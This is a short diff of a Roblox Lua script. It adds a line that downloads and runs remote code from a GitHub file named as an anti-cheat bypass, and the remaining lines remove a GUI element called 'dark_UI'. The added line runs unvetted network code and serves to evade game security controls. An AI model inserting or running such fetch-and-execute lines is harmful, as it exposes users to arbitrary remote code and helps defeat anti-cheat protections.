@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LegoHacker1337/AntiCheat-bypasses/main/Anti-Anti%20dex%20explorer.lua"))()
 for _,v in pairs(game.CoreGui:GetChildren()) do
     if v.Name == "dark_UI" then
         v:Destroy()
